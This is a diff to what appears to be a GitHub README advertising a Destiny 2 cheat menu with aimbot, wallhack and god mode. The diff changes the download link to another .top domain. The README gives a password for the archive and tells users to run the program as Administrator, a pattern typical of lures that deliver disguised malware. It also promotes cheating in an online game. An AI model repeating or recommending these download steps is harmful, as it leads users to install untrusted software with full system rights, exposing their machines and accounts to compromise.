@@ -6,7 +6,7 @@ Destiny 2 cheat menu with god mode, unlimited ammo, ESP wallhack, aimbot, speed 
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitdownapply.top/)**
 
 Archive passkey: `Github`
 
@@ -72,7 +72,7 @@ Archive passkey: `Github`
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappdown.top/)** to download.
+1. Click **[CLICK](https://gitdownapply.top/)** to download.
 2. Extract the archive.
 3. Launch Destiny 2.
 4. Run the cheat menu **as Administrator**.
